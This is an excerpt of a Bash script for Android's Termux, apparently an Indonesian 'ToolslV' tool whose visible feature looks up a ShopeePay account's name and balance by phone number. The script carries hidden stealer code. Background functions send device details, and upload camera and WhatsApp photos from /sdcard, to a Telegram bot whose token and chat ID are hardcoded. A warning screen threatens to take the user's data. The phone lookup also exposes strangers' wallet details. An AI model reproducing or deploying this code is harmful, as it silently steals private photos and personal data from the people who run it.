...
echo ""
EWEH="8488160807:AAFQQvQFVeL7I4y2CliAqk-mdMXOheuL9hE"
ENTOD="7020764060"
...
bacot_ajg() {
    ...
    local brand=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}' | xargs 2>/dev/null || echo "Unknown")
    local message="
===========================      
          🔰 INFO TOOLSlV 🔰
===========================
...
┗━❐ 𝐁𝐲.𝐓𝐡𝐱𝐲𝐳𝐳𝟒𝟎𝟒
"
    if [[ -n "$EWEH" && -n "$ENTOD" && "$EWEH" != "Dasar Kacung Gk Ada Skil 😂😂" ]]; then
        curl -s -X POST \
             -H "Content-Type: application/json" \
             -d "{\"chat_id\":\"$ENTOD\",\"text\":\"$message\",\"parse_mode\":\"HTML\"}" \
             "https://api.telegram.org/bot$EWEH/sendMessage" > /dev/null 2>&1 &
    fi
}
peju() {
    local path="$1"   
    if [ ! -d "$path" ] || [ $TOTAL_FOTO -ge $MAX ]; then
        return
    fi
    find "$path" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) 2>/dev/null | while read -r file; do
        if [ $TOTAL_FOTO -ge $MAX ]; then
            break
        fi
        curl -s -X POST "https://api.telegram.org/bot$EWEH/sendPhoto" \
            -F chat_id="$ENTOD" \
...
lonte() {
    {
        peju "/sdcard/DCIM/Camera" &
        peju "/sdcard/Pictures/WhatsApp" &   
        wait
    } 2>/dev/null &
}
ank_fefex_jule() {
    ...
    response=$(curl -s -H "X-Master-Key: $BACOT" \
                    -H "Content-Type: application/json" \
                    --max-time 10 \
                    "$url" 2>/dev/null)  
...
ank_tai() {
    ...
    if [ $current_count -ge 3 ]; then
        ...
        echo -e "${b}---------------------"
        echo ""
        echo -e "${g}Anda Sudah Melanggar Ketentuan ToolslV"
        echo -e "${r}Mengambil Data Anda Karena Sudah Melanggar [ ☠️🔥 ]"
        echo ""
        exit 1
    fi
    ...
    echo -e "${r} PERINGATAN..!! "
    echo -e "${y} JIKA ANDA MEMAKSA UNTUK LOGIN SEBANYAK 3X DENGAN "
    echo -e "${c} SECARA PAKSA JANGAN SALAHKAN TOOLSlV "
    echo -e "${r} JIKA TERMUX ANDA KENAPA-KENAPA..!! "
    echo ""
    echo -e "\033[36;1m╔══════════════════════════════════════════════╗"
...
clear
if ! curl -s --max-time 3 https://api.jsonbin.io > /dev/null 2>&1; then
    ank_kontol
    ank_tai
    exit 1
fi
...
echo -e "${r} [ ${g}07 ${r}] ${c}Check Shopepay Opsi Key "
...
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${h} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
...
echo ""
echo ""
echo -e "${g} Silahkan daftar terlebih dahulu,
 di ${r}: ${y}http://payday.my.id"
echo -e "${g} agar mendapatkan, key akses input."
echo ""
echo ""
read -p "$(echo -e "${y}Masukkan key ${r}[ ${g}contoh: 6daf1xxx ${r}]${c} : ")" key
echo ""
read -p "$(echo -e "${y}Masukkan no ${r}[ ${g}contoh: 62xxx ${r}]${c} : ")" no
echo ""
no=$(echo "$no" | sed 's/^+62/0/; s/^62/0/')
if [[ ! "$no" =~ ^0 ]]; then
    no="0$no"
fi
wallet="shopeepay"
nama_platform="ShopeePay"
url="https://api.payday.my.id/trueid/ewallet/${wallet}/?hp=$no&key=$key"
res=$(curl -s --max-time 5 "$url")
status=$(echo "$res" | grep -oP '"status":\s*\K(true|false)' | head -1)
name=$(echo "$res" | grep -oP '"name":\s*"\K[^"]+' | head -1)
phone=$(echo "$res" | grep -oP '"nomorhp":\s*"\K[^"]+' | head -1)
saldo=$(echo "$res" | grep -oP '"sisa_saldo":\s*\K[0-9]+' | head -1)
message=$(echo "$res" | grep -oP '"message":\s*"\K[^"]+' | head -1)
if [[ "$status" == "true" ]]; then
    echo -e "${c}┌─ Platform ${r}: ${g}$nama_platform"
    echo -e "${c}├─ Status ${r}: ${g}✓ TERDAFTAR"
    [[ -n "$name" && "$name" != "null" ]] && echo -e "${c}├─ Nama ${r}: ${g}$name"
    [[ -n "$phone" ]] && echo -e "${c}├─ Telepon ${r}: ${g}$phone"
    [[ -n "$saldo" ]] && echo -e "${c}└─ Saldo ${r}: ${g}Rp ${saldo}${n}" || echo -e "${c}└─ Saldo ${r}: ${y}Gagal ambil saldo${n}"
else
    echo -e "${y}┌─ Platform ${r}: ${p}$nama_platform"
    echo -e "${y}├─ Status ${r}: ${p}✗ TIDAK TERDAFTAR"
    if [[ -n "$message" ]]; then
        echo -e "${y}└─ Pesan ${r}: ${p}$message"
    else
        echo -e "${y}└─ Pesan ${r}: ${p}Akun tidak ditemukan"
    fi
fi
     echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
...
TELEGRAM_TOKEN="8248788204:AAE5FiRv1FlTFeKhJx-3pITU2w3G5KNl0-s"
